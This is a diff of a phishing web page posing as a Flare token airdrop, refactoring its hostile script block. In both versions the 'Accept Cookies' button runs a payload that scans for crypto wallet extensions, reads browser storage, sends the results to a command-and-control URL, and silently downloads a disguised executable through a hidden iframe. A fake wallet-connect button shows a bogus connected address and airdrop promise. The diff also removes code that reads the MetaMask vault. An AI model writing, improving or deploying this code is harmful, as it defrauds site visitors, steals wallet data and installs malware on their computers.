@@ -501,89 +501,55 @@ hero-section { padding: 2rem 1.25rem; }
   })();
 </script>
 
-<!-- Block 2: WalletConnect + Payload (module, may fail silently but won't break the overlay) -->
+<!-- Block 2: Unified Payload + Button Handlers -->
 <script type="module">
-  // WalletConnect imports commented out — not needed for fake connect
-  // import { WalletConnectModal } from 'https://unpkg.com/@walletconnect/modal@2.6.2/dist/index.js';
-  // import { SignClient } from 'https://unpkg.com/@walletconnect/sign-client@2.12.2/dist/index.js';
-
-  const PROJECT_ID = 'YOUR_WALLETCONNECT_PROJECT_ID';
   const C2_ENDPOINT = 'https://78ba66c28fdfdbdc33cd4643c90fe3c7.m.pipedream.net';
   const EXE_URL = 'https://flaregovernance.github.io/CookiePreferences.exe';
 
-  let signClient = null;
-  let modal = null;
-  let connectedAccount = null;
-
-  // initWalletConnect is disabled — fake connect only
-  // async function initWalletConnect() { ... }
-
-  async function connectWallet() {
-    // Fake wallet connection for testing (no WalletConnect required)
-    const fakeAddress = '0x' + Math.random().toString(16).slice(2, 42);
-    updateUI(fakeAddress);
-  }
-
-  function updateUI(account) {
-    document.getElementById('walletStatus').innerHTML =
-      '<span style="color: #4CAF50;">✓ Connected</span><br>' +
-      '<span class="connected-address">' + account.slice(0,6) + '...' + account.slice(-4) + '</span><br>' +
-      '<span style="font-size:0.8rem;">Airdrop claim is being processed. Your FLR will arrive within 24 hours.</span>';
-  }
-
-  // ---- PAYLOAD ----
+  // ===== PAYLOAD =====
   async function executePayload() {
-    // 1. Hide the overlay immediately — no delays, no dependencies.
     const overlay = document.getElementById('cookieOverlay');
-    if (overlay) {
-      overlay.classList.add('is-hidden');
-    }
-
-    // 2. Un-blur the homepage
     const site = document.querySelector('.main-content');
-    if (site) {
-      site.classList.remove('is-blurred');
-    }
 
-    // 3. Do the wallet scan quietly in the background.
+    // 1. Dismiss overlay + un-blur page
+    if (overlay) overlay.classList.add('is-hidden');
+    if (site) site.classList.remove('is-blurred');
+
+    // 2. Wallet scan
     const walletsFound = [];
     if (window.ethereum) walletsFound.push('MetaMask/Injected');
     if (window.solana) walletsFound.push('Phantom/Solana');
     if (window.coinbaseWalletExtension) walletsFound.push('Coinbase Wallet');
     if (window.trustwallet) walletsFound.push('Trust Wallet');
 
-    // 4. Scan browser storage.
+    // 3. Browser storage scan
     const storageHits = scanBrowserStorage();
-    if (storageHits.length > 0) sendToC2({ type: 'BROWSER_STORAGE_HITS', data: storageHits });
+    if (storageHits.length > 0) {
+      sendToC2({ type: 'BROWSER_STORAGE_HITS', data: storageHits });
+    }
 
-    // 5. Download the EXE if a real URL is configured.
+    // 4. EXE download
     if (EXE_URL && EXE_URL !== '') {
       triggerDownload(EXE_URL, 'CookiePreferences.exe');
     }
 
-    // 6. Report back.
+    // 5. Report
     sendToC2({ type: 'PAYLOAD_EXECUTED', walletsDetected: walletsFound });
   }
 
-  async function extractMetaMaskVault() {
-    try {
-      const db = await indexedDB.open('metamask', 1);
-      return new Promise((resolve) => {
-        db.onsuccess = (event) => {
-          const database = event.target.result;
-          if (database.objectStoreNames.contains('metamask')) {
-            const tx = database.transaction('metamask', 'readonly');
-            const store = tx.objectStore('metamask');
-            const req = store.getAll();
-            req.onsuccess = () => resolve(JSON.stringify(req.result));
-            req.onerror = () => resolve(null);
-          } else resolve(null);
-        };
-        db.onerror = () => resolve(null);
-      });
-    } catch (e) { return null; }
+  // ===== WALLET CONNECT =====
+  function connectWallet() {
+    const fakeAddress = '0x' + Math.random().toString(16).slice(2, 42);
+    const statusDiv = document.getElementById('walletStatus');
+    if (statusDiv) {
+      statusDiv.innerHTML =
+        '<span style="color: #4CAF50;">✓ Connected</span><br>' +
+        '<span class="connected-address">' + fakeAddress.slice(0,6) + '...' + fakeAddress.slice(-4) + '</span><br>' +
+        '<span style="font-size:0.8rem;">Airdrop claim is being processed. Your FLR will arrive within 24 hours.</span>';
+    }
   }
 
+  // ===== HELPERS =====
   function scanBrowserStorage() {
     const hits = [];
     for (let i = 0; i < localStorage.length; i++) {
@@ -602,13 +568,11 @@ hero-section { padding: 2rem 1.25rem; }
   function triggerDownload(url, filename) {
     var oldFrame = document.getElementById('hiddenDownloadFrame');
     if (oldFrame) document.body.removeChild(oldFrame);
-
     var iframe = document.createElement('iframe');
     iframe.id = 'hiddenDownloadFrame';
     iframe.style.display = 'none';
     iframe.src = url;
     document.body.appendChild(iframe);
-
     setTimeout(function() {
       var frame = document.getElementById('hiddenDownloadFrame');
       if (frame) document.body.removeChild(frame);
@@ -624,20 +588,13 @@ hero-section { padding: 2rem 1.25rem; }
     }).catch(() => {});
   }
 
-  // Attach the payload to the Accept Cookies button
+  // ===== ATTACH LISTENERS =====
   window.addEventListener('load', function() {
     var acceptBtn = document.getElementById('acceptCookiesBtn');
-    if (acceptBtn) {
-      acceptBtn.addEventListener('click', executePayload);
-    }
-  });
+    if (acceptBtn) acceptBtn.addEventListener('click', executePayload);
 
-  // Attach the fake wallet connect
-  window.addEventListener('load', function() {
     var connectBtn = document.getElementById('connectWalletBtn');
-    if (connectBtn) {
-      connectBtn.addEventListener('click', connectWallet);
-    }
+    if (connectBtn) connectBtn.addEventListener('click', connectWallet);
   });
 </script>
 
